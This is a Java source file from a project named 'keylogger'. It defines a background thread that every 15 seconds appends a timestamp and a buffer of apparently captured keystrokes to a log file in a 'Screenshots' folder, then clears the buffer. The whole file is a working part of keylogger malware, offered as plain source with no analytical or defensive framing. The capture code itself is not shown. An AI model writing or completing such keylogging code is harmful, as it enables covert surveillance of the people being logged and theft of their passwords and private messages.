/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author sparsha
 */
public class TimeThreader extends Thread{
    FileWriter fw;
        BufferedWriter bw;
    @Override
    public void run()
    {
        
        while(true){
            try {
                fw=new FileWriter("Screenshots/logs.txt",true);
                bw=new BufferedWriter(fw);
                bw.write(Keylogger.x+" :"+Keylogger.buffer_str+"\n");
                bw.close();
                fw.close();
                Keylogger.buffer_str="";
                
            } catch (IOException ex) {
                Logger.getLogger(TimeThreader.class.getName()).log(Level.SEVERE, null, ex);
            }
        Keylogger.x=Calendar.getInstance().getTime();
        
            try {
                Thread.sleep(1000*15);
            } catch (InterruptedException ex) {
                Logger.getLogger(TimeThreader.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        
    }
    
}
